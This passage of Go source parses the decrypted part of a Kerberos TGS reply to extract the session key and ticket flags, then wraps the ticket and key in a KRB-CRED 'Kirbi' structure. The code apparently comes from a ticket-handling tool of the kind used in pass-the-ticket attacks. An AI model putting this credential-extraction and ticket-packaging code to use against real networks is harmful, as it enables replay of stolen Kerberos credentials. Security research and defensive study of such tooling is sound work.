	pos := 2
	if data[1] == 0x82 {
		pos = 4
	} else if data[1] == 0x81 {
		pos = 3
	}

	// Skip SEQUENCE header
	if data[pos] == 0x30 {
		if data[pos+1] == 0x82 {
			pos += 4
		} else if data[pos+1] == 0x81 {
			pos += 3
		} else {
			pos += 2
		}
	}

	encPart := &asn1krb5.EncTGSRepPart{}

	// Parse fields
	for pos < len(data) {
		if data[pos] < 0xa0 {
			break
		}
		tag := int(data[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if data[pos+1] == 0x82 {
			fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			contentPos = pos + 4
		} else if data[pos+1] == 0x81 {
			fieldLen = int(data[pos+2])
			contentPos = pos + 3
		} else if data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		fieldData := data[contentPos : contentPos+fieldLen]

		if tag == 0 { // key (EncryptionKey)
			// EncryptionKey ::= SEQUENCE { [0] keytype, [1] keyvalue }
			if fieldData[0] == 0x30 {
				keyPos := 2
				if fieldData[1] >= 0x80 {
					keyPos = 3 + (int(fieldData[1]) - 0x80)
				}
				for keyPos < len(fieldData) {
					ktag := int(fieldData[keyPos] - 0xa0)
					klen := int(fieldData[keyPos+1])
					kstart := keyPos + 2
					if ktag == 0 { // keytype
						if kstart+2 < len(fieldData) && fieldData[kstart] == 0x02 {
							encPart.Key.KeyType = int32(fieldData[kstart+2])
						}
					} else if ktag == 1 { // keyvalue
						if kstart < len(fieldData) && fieldData[kstart] == 0x04 {
							kvlen := int(fieldData[kstart+1])
							kvstart := kstart + 2
							if fieldData[kstart+1] == 0x81 {
								kvlen = int(fieldData[kstart+2])
								kvstart = kstart + 3
							}
							encPart.Key.KeyValue = fieldData[kvstart : kvstart+kvlen]
						}
					}
					keyPos += 2 + klen
				}
			}
		} else if tag == 4 { // flags (BitString)
			if fieldData[0] == 0x03 {
				bitLen := int(fieldData[1])
				if bitLen > 1 {
					unusedBits := fieldData[2]
					encPart.Flags.BitLength = (bitLen - 1) * 8
					encPart.Flags.Bytes = fieldData[3 : 2+bitLen]
					_ = unusedBits
				}
			}
		}

		pos = contentPos + fieldLen
	}

	if len(encPart.Key.KeyValue) == 0 {
		return nil, fmt.Errorf("session key not found in EncKDCRepPart")
	}

	return encPart, nil
}

// buildKirbiFromTGSRaw builds a Kirbi from raw ticket bytes and session key.
func buildKirbiFromTGSRaw(ticketBytes []byte, sessionKey asn1krb5.EncryptionKey) (*ticket.Kirbi, error) {
	t := asn1krb5.Ticket{RawBytes: ticketBytes}

	kirbi := &ticket.Kirbi{
		Cred: &asn1krb5.KRBCred{
			PVNO:    5,
			MsgType: 22,
			Tickets: []asn1krb5.Ticket{t},
		},
		CredInfo: &asn1krb5.EncKRBCredPart{
			TicketInfo: []asn1krb5.KRBCredInfo{
				{Key: sessionKey},
			},
		},
	}

	return kirbi, nil
}
